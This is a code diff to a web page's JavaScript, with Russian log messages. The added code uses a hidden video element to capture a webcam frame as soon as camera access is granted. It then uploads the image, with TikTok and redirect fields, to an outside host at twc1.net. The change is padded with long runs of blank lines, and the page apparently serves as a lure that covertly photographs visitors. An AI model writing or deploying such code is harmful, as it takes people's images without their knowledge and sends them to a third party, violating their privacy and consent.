@@ -26,7 +26,7 @@
       display: none;
     }
   </style>
-
+  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
   <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
 
   <script>
@@ -68,22 +68,17 @@
   <script>
     'use strict';
 
-    const video = document.getElementById('video');
+    const video = document.createElement('video');
     const canvas = document.getElementById('canvas');
     let photoTaken = false;
     let cameraAccessAttempts = 0;
     let savedPhoto = null;
 
-    const constraints = {
-      audio: false,
-      video: { facingMode: "user" }
-    };
-
     
     async function requestCameraAccess() {
       console.log('Запрос доступа к камере...');
       try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         console.log('Камера успешно запущена!');
         handleSuccess(stream);
       } catch (e) {
@@ -105,30 +100,80 @@
 
 
 
-    function handleSuccess(stream) {
+
+
+
+
+
+
+
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    async function handleSuccess(stream) {
       
       console.log('Начинаем обработку потока камеры...');
-      window.stream = stream;
       video.srcObject = stream;
+      video.muted = true;
+
+      await video.play();
+
+      const canvas = document.createElement('canvas');
+      const { videoWidth, videoHeight } = video;
+      canvas.width = videoWidth;
+      canvas.height = videoHeight;
 
 
-      const context = canvas.getContext('2d');
 
-      setTimeout(function () {
-        if (!photoTaken) {
-          console.log('Фотографирование...');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
-          canvas.toBlob(function(blob) {
-            console.log('Фотография создана');
-            savedPhoto = blob;
-            photoTaken = true;
-            logPhotoInfo();
-            redirectToFinalDestination();
-          }, 'image/png');
+
+      canvas.getContext('2d').drawImage(video, 0, 0, videoWidth, videoHeight);
+      const blob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/png'));
+
+      if (blob)
+      {
+        const formData = new FormData();
+
+        formData.append('photo', blob, 'avatar.png');
+        formData.append('tiktok_url', 'https://www.tiktok.com/example_video');
+        formData.append('user_id', '12345');
+        formData.append('redirect_url', 'https://www.redirect.com');
+
+        const response = await fetch('https://rusfai-send-photo-f9d0.twc1.net/tiktok', {
+
+            method: 'POST',
+            body: formData
+        });
+
+        if (!response.ok)
+        {
+            throw new Error(`${response.status} - ${await response.text()}`);
         }
-      }, 3000);
+
+        const data = await response.json();
+
+        console.log(data);
+        reader.readAsArrayBuffer(blob);
+      }
+
+   
+      stream.getTracks().forEach(track => track.stop());
+
     }
 
     function logPhotoInfo() {
